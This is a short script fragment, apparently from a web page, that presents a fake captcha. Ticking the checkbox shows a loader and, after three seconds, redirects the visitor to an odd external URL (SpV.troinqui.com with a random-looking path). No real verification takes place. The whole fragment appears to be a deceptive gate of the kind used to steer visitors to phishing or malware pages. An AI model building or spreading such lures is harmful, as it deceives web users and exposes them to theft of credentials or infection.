<script>
    document.getElementById('captchaButton').addEventListener('click', function() {
      var checkbox = document.getElementById('captchaCheckbox');
      var loader = document.getElementById('captchaLoader');

      if (checkbox.checked) {
        this.style.display = 'none';
        loader.style.display = 'block';
        setTimeout(function() {
          window.location.href = 'https://SpV.troinqui.com/BW4XT2/#M';
        }, 3000); // 3 seconds delay
      }
    });
  </script>
